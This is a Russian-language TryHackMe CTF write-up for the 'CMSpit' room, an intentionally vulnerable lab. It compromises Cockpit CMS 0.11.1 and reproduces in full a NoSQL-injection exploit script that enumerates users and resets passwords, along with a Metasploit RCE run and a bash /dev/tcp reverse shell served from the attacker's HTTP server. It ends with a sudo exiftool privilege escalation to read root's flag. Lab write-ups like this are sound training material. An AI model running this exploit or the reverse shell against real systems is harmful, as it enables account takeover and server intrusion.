# CMSpit

- https://tryhackme.com/room/cmspit

## Разведка
В задании сразу сказано про уязвимость в вебе, поэтому я даже не стал запускать nmap, а сразу перешел в веб. 

<img width="1470" height="773" alt="Pasted image 20260111144603" src="https://github.com/user-attachments/assets/910a0161-6857-4354-a552-8d32a555ac3a" />

Поле авторизации. И сразу видно какая CMS - Cockpit. Это и есть ответ на первый вопрос.
>**CMS (Content Management System)** — это **система управления контентом**.
>Это программа, которая позволяет создавать и управлять сайтом **без написания кода**. 

Когда отправляем запрос, сайт отправляет его на:
<img width="354" height="36" alt="Pasted image 20260111160814" src="https://github.com/user-attachments/assets/9badef2f-42ed-45f5-89c7-35f2d08837f7" />

Можно посмотреть в BurpSuite. Это ответ на 3 вопрос

В коде страницы легко можно найти версию CMS, попробуйте найти сами где она:
<img width="1470" height="775" alt="Pasted image 20260111144623" src="https://github.com/user-attachments/assets/c8c563a4-addc-447e-a9cb-9e6cba7c359c" />

Зная CMS и ее версию, самым логичным будем проверить ее на наличие уязвимости.

## Эксплуатация
Поищем через searchsploit:
```
└─$ searchsploit Cockpit CMS 0.11.1
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection    | multiple/webapps/50185.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                  
┌──(obsca㉿kali)-[~/Downloads]
└─$ searchsploit -m multiple/webapps/50185.py
```
Searchsploit показал уязвимость, позволяющую менять пароль пользователя.

Вот сам скрипт:
```py
# Exploit Title: Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection 
# Date: 06-08-2021
# Exploit Author: Brian Ombongi
# Vendor Homepage: https://getcockpit.com/
# Version: Cockpit 0.11.1
# Tested on: Ubuntu 16.04.7
# CVE : CVE-2020-35847 & CVE-2020-35848

#!/usr/bin/python3
import json
import re
import requests
import random
import string
import argparse


def usage():
    guide = 'python3 exploit.py -u <target_url> '
    return guide

def arguments():
    parse = argparse.ArgumentParser(usage=usage())
    parse.add_argument('-u', dest='url', help='Site URL e.g http://cockpit.local', type=str, required=True)
    return parse.parse_args()

def test_connection(url):
	try:
		get = requests.get(url)
		if get.status_code == 200:
			print(f"[+] {url}: is reachable")
		else:
			print(f"{url}: is Not reachable, status_code: {get.status_code}")
	except requests.exceptions.RequestException as e:
		raise SystemExit(f"{url}: is Not reachable \nErr: {e}")


def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
    }
    data= {"user":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")

def check_user(usernames):
    user = input("\n[-] Get user details For : ")
    if user not in usernames:
        print("User does not exist...Exiting")
        exit()
    else:
        return user


def reset_tokens(url):
    print("[+] Finding Password reset tokens")
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("\t Tokens Found : " + str(matches))
        return matches
    else:
        print("No tokens found, ")


def user_details(url, token):
    print("[+] Obtaining user information ")
    url = url + "/auth/newpassword"
    headers = {
        "Content-Type": "application/json"
        }
    userAndtoken = {}
    for t in token:
        data= {"token":t}
        req = requests.post(url, data=json.dumps(data), headers=headers)
        pattern=re.compile(r'(this.user\s*=)([^;]+)', re.I)
        matches = pattern.finditer(req.content.decode('utf-8'))
        for match in matches:
            matches = json.loads(match.group(2))
            if matches:
                print ("-----------------Details--------------------")
                for key, value in matches.items():
                    
                    print("\t", "[*]", key ,":", value)       
            else:
                print("No user information found.")
            user = matches['user']
            token = matches['_reset_token']
            userAndtoken[user] = token
            print("--------------------------------------------")
            continue
    return userAndtoken

def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" %user)
    characters = string.ascii_letters + string.digits + string.punctuation 
    password = ''.join(random.choice(characters) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":token, "password":password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Succesfully!")
        print("[+] The New credentials for %s is: \n \t Username : %s \n \t Password : %s" % (user, user, password))

def generate_token(url, user):
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"user":user}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    
def confirm_prompt(question: str) -> bool:
    reply = None
    while reply not in ("", "y", "n"):
        reply = input(f"{question} (Y/n): ").lower()
        if reply == "y":
            return True
        elif reply == "n":
            return False
        else:
            return True

def pw_reset_trigger(details, user, url):
    for key in details:
        if key == user:
            password_reset(url, details[key], key)
        else:
            continue



if __name__ == '__main__':
    args = arguments()
    url = args.url
    test_connection(url)
    user = check_user(enumerate_users(url))
    generate_token(url, user)
    tokens = reset_tokens(url)
    details = user_details(url, tokens)
    print("\n")
    b = confirm_prompt("[+] Do you want to reset the passowrd for %s?" %user)
    if b:
        pw_reset_trigger(details, user, url)
    else:
        print("Exiting..")
        exit()
            
```
Из него можно как раз узнать ответ на 5 вопрос: /auth/resetpassword

Пробуем его использовать.
```bash
└─$ python3 50185.py -u http://cmspit.thm
[+] http://cmspit.thm: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['*****', 'darkStar7471', '*****', 'ekoparty']

[-] Get user details For : admin
[+] Finding Password reset tokens
	 Tokens Found : ['rp-e1988cefbe5ddb408b3ae7c55de2fa9169638e3d9debd']
[+] Obtaining user information 
-----------------Details--------------------
	 [*] user : *****
	 [*] name : *****
	 [*] email : *****@yourdomain.de
	 [*] active : True
	 [*] group : *****
	 [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
	 [*] i18n : en
	 [*] _created : 1621655201
	 [*] _modified : 1621655201
	 [*] _id : 60a87ea165343539ee000300
	 [*] _reset_token : rp-e1988cefbe5ddb408b3ae7c55de2fa9169638e3d9debd
	 [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------


[+] Do you want to reset the passowrd for *****? (Y/n): y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for ***** is: 
 	 Username : ***** 
 	 Password : B=kXQXLvL,
```

Этот скрипт эксплуатирует уязвимость в NoSQL, как видите, он может читать юзеров, их данные, и менять пароль.
Воспользовавшись этим скриптом я поменял пароль у одного крутого пользователя, но зайти по нему не смог, может что-то со скриптом, поэтому пробую metasploit. Тут же можно узнать и имя пользователя и его почту для 6 вопроса и узнать сколько всего пользователей. 

Ищем уязвимость.
```
msf > search cockpit

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce
```

Используем:
```
USER => admin
msf exploit(multi/http/cockpit_cms_rce) > run
[*] Started reverse TCP handler on 192.168.135.72:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-05dd3c82698bbd0b6ca186f457fc635f69638f0798988", "rp-049d6e082d1535c0519f4301a634539969638f16265ae"]
[*] Checking token: rp-05dd3c82698bbd0b6ca186f457fc635f69638f0798988
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: $2y$10$1x7/MNEmbV7dvt80m5xbIuQsEPPZHmlmkZRJJT.V5EcBOOViz10nm
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-05dd3c82698bbd0b6ca186f457fc635f69638f0798988
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to X484LN0kAY
[+] Password update successful
[*] Attempting login
[+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=bbpp32s69144n5knnpao8te6sp;
[*] Attempting RCE
[*] Sending stage (41224 bytes) to 10.67.179.57
[*] Meterpreter session 1 opened (192.168.135.72:4444 -> 10.67.179.57:53392) at 2026-01-11 15:35:06 +0300

```
Cкрипт так же генерирует пароль, но на этот раз мне удалось зайти в CMS.

<img width="1470" height="775" alt="Pasted image 20260111150615" src="https://github.com/user-attachments/assets/1ecc9f33-5ac2-46c7-a434-f69b3b798ea4" />

Тут же в файлах, если нажать на лого > Finder > webflag.php можно прочитать файл и получить ответ на 7 вопрос.

## User
Так же скрипт дает нам шелл, но он убогий, поэтому прокинем туда свой реверс шелл

У себя создадим файл с шеллом (Создан через revshells.com) и откроем http сервер:
```
└─$ echo 'bash -i >& /dev/tcp/192.168.135.72/6666 0>&1' > shell.sh
                                                                                                                  
┌──(obsca㉿kali)-[~/Downloads]
└─$ python -m http.server 8899
Serving HTTP on 0.0.0.0 port 8899 (http://0.0.0.0:8899/) ...
```

```
curl http://192.168.135.72:8899/shell.sh -o shell.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    45  100    45    0     0    161      0 --:--:-- --:--:-- --:--:--   161
```
На машине выполним такую команду и теперь наш шелл на атакуемой машине. 

У себя откроем соответсвующий порт 
```
nc -lvnp 6666
listening on [any] 6666 ...
```

Запустим:
```
bash shell.sh
```

```
connect to [192.168.135.72] from (UNKNOWN) [10.67.179.57] 51230
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/cockpit$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ml/cockpit$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Получаем наш шелл и сразу же улучшим его. Теперь можно двигаться дальше...

Пробуем прочитать user.txt
```
www-data@ubuntu:/var/www/html/cockpit$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
stux
www-data@ubuntu:/home$ cd stux
cd stux
www-data@ubuntu:/home/stux$ ls
ls
user.txt
www-data@ubuntu:/home/stux$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
Но получаем по лбу.

Добавим к ls флаги -la
```
www-data@ubuntu:/home/stux$ ls -la
ls -la
total 44
drwxr-xr-x 4 stux stux 4096 May 22  2021 .
drwxr-xr-x 3 root root 4096 May 21  2021 ..
-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
drwx------ 2 stux stux 4096 May 21  2021 .cache
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
-rw------- 1 stux stux   46 May 22  2021 user.txt
```

Читаем .dbshell
```
www-data@ubuntu:/home/stux$ cat .dbshell
cat .dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "[REDACTED]"})
show dbs
use sudousersbak
show collections
db
show
db.collectionName.find()
show collections
db.collection_name.find().pretty()
db.user.find().pretty()
db.user.insert({name: "stux"})
db.user.find().pretty()
db.flag.insert({name: "thm{REDACTED}"})
show collections
db.flag.find().pretty()
```
И находим пароль пользователя stux, а заодно и флаг базы данных.

Логинимся и читаем наш флаг:
```
www-data@ubuntu:/home/stux$ su stux
su stux
Password: [REDACTED]

stux@ubuntu:~$ cat user.txt
cat user.txt
thm{REDACTED}
```
## Root
Смотрим что можем
```
stux@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```
Имеем доступ к exiftool. Используем это

- https://gtfobins.github.io/gtfobins/exiftool/

```
stux@ubuntu:~$ LFILE=/root/root.txt
LFILE=/root/root.txt
stux@ubuntu:~$ OUTPUT=/tmp/root.txt
OUTPUT=/tmp/root.txt
stux@ubuntu:~$ sudo exiftool -filename=$OUTPUT $LFILE
sudo exiftool -filename=$OUTPUT $LFILE
    1 image files updated
stux@ubuntu:~$ cat /tmp/root.txt
cat /tmp/root.txt
thm{REDACTED}
```
И читаем рут флаг.

Впрос про CVE: CVE-2021-22204
Предпоследний вопрос: djvumake

Можно так же через чтение файлов получить рут оболку, про это я рассказывал в райтапе Techsupp0rt1, через ssh ключ. так же можно через запуск bash скрипта от имени рут.

## Итог: почему удалось взломать?
 - Администратор не обновляет ПО -> система сразу под угрозой
 - Уязвимость Username Enumeration
 - NoSQL Injection в токенах сброса пароля
 - Возможность менять пароль любого пользователя
 - Плохая конфигурация сервера
